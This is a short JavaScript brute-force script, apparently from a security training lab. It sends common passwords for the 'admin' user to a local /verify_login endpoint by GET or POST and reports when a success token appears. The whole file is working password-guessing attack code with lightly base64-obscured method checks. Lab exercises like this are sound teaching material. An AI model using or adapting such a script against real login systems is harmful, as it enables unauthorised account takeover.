// Developer Comment: Sending username + password to this URL for verification. Change as required. 
let URL_TO_TEST = "http://127.0.0.1:5000/verify_login"

let i = 0
let password_found = false

// Developer Comment: Passwords to test using brute force. Add more common passwords as required.
wordlist = ["123456", "12345678", "qwerty"]

var xhttp = new XMLHttpRequest();

function makeRequest() {
    
    console.log("Trying password: " + wordlist[i])

    // Set HTTP request method for contacting server 
    let METHOD_TO_USE = "GET"

    let a = METHOD_TO_USE
    if (a == atob("R0VU")) {
        xhttp.open(METHOD_TO_USE, URL_TO_TEST + "?" + "nm=admin&password=" + wordlist[i], true);
        xhttp.send()
    }
    else if (a == atob("UE9TVA==")) {
        xhttp.open(METHOD_TO_USE, URL_TO_TEST, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send("nm=admin&password=" + wordlist[i]);
    }  
}

makeRequest();

xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    if (this.responseText.includes("39d9147c-d065-4aba-980e-6f86942c319f")) {
        console.log(wordlist[i] + " is incorrect")
    }
    else if (this.responseText.includes("e4b2a605-ad6c-45f5-9519-2905fe347b27")) {
        console.log("Password correct")
        console.log("Stopping script...")
        password_found = true
        return
    }
    else {
        console.log("Script error: URL appears to be incorrect. What is the correct URL you need to use?")
        console.log("Stopping script...")
        return
    }
    console.log("---")
    i++;
    if (i < wordlist.length){
        makeRequest()
    } else if (password_found == false) {
        console.log(`Script message: Brute force search of ${wordlist.length} passwords completed with no password found. Do you need to use a different wordlist?`)
    }
  } 
  else if (this.readyState == 4 && this.status == 404) {
    console.log("Script error: URL NOT FOUND. URL used may be incorrect. What is the correct URL you need to use?")
  }
  else if (this.readyState == 4 && this.status == 405) {
    console.log("Script error: METHOD NOT ALLOWED. HTTP request method used may be incorrect. What is the correct HTTP request method you need to use?")
  }
};
